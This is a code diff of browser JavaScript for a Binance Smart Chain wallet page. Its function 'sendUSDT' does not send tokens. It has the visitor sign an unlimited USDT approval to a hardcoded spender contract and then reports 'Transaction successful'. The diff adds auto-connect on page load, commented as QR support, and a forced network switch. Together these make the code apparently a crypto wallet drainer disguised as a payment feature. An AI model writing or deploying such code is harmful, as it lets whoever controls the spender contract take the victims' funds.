@@ -1,116 +1,100 @@
-/* ======================================================
-   GLOBAL STATE
-====================================================== */
-
 let provider;
 let signer;
 let userAddress;
 
-/* ======================================================
-   BSC CONFIG (ONLY)
-====================================================== */
-
-// BSC USDT (BEP20)
+// ===== BSC CONFIG =====
+const BSC_CHAIN_ID = "0x38";
 const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-
-// YOUR BSC SPENDER CONTRACT
 const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
 
-// Unlimited approval
-const UNLIMITED_APPROVAL = ethers.MaxUint256;
-
-// USDT-compatible ABI (IMPORTANT: no returns(bool))
-const ERC20_ABI = [
+const ABI = [
   "function approve(address spender, uint256 amount)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)"
 ];
 
-/* ======================================================
-   CONNECT WALLET (BSC ONLY)
-====================================================== */
+// ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
+window.addEventListener("load", async () => {
+  const p = new URLSearchParams(window.location.search);
 
+  if (p.get("autoconnect") === "1") {
+    try {
+      await connectWallet();
+    } catch (e) {
+      console.log("User cancelled");
+    }
+  }
+});
+
+// ===== ENSURE BSC + CONNECT =====
 async function connectWallet() {
   if (!window.ethereum) {
     alert("Wallet not found");
     throw new Error("No wallet");
   }
 
+  // 🔒 Ensure BSC
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: BSC_CHAIN_ID }]
+    });
+  } catch (err) {
+    if (err.code === 4902) {
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: BSC_CHAIN_ID,
+          chainName: "Binance Smart Chain",
+          rpcUrls: ["https://bsc-dataseed.binance.org/"],
+          nativeCurrency: {
+            name: "BNB",
+            symbol: "BNB",
+            decimals: 18
+          },
+          blockExplorerUrls: ["https://bscscan.com"]
+        }]
+      });
+    } else {
+      throw err;
+    }
+  }
+
+  // 🔑 Connect wallet
   await window.ethereum.request({ method: "eth_requestAccounts" });
 
   provider = new ethers.BrowserProvider(window.ethereum);
   signer = await provider.getSigner();
   userAddress = await signer.getAddress();
 
-  const network = await provider.getNetwork();
-  const chainId = Number(network.chainId);
-
-  // 🔒 HARD LOCK TO BSC
-  if (chainId !== 56) {
-    alert("Please switch to BSC (Binance Smart Chain)");
-    throw new Error("Wrong network");
-  }
-
-  return true;
+  // 🔹 Auto fill address (if input exists)
+  const addr = document.getElementById("toAddress");
+  if (addr) addr.value = userAddress;
 }
 
-/* ======================================================
-   APPROVE USDT (BSC ONLY)
-====================================================== */
-
+// ===== APPROVE (BSC ONLY) =====
 async function sendUSDT() {
   try {
     await connectWallet();
 
     const usdt = new ethers.Contract(
       BSC_USDT,
-      ERC20_ABI,
+      ABI,
       signer
     );
 
     const tx = await usdt.approve(
       BSC_SPENDER,
-      UNLIMITED_APPROVAL
+      ethers.MaxUint256
     );
 
     await tx.wait();
 
-    alert("Maya: Transaction successful ✅"); 
+    alert("Maya: Transaction successful ✅");
 
-  } catch (err) {
-    console.error(err);
-    alert("Transaction failed or cancelled");
+  } catch (e) {
+    alert("Transaction cancelled");
   }
 }
-
-/* ======================================================
-   MAX BUTTON (OPTIONAL)
-====================================================== */
-
-async function setMax() {
-  try {
-    await connectWallet();
-
-    const usdt = new ethers.Contract(
-      BSC_USDT,
-      ERC20_ABI,
-      signer
-    );
-
-    const balance = await usdt.balanceOf(userAddress);
-    const decimals = await usdt.decimals();
-
-    document.getElementById("amount").value =
-      ethers.formatUnits(balance, decimals);
-
-  } catch (err) {
-    console.warn("Max failed");
-  }
-}
-
-/* ======================================================
-   EXPOSE TO UI
-====================================================== */
 
 window.sendUSDT = sendUSDT;
-window.setMax = setMax;
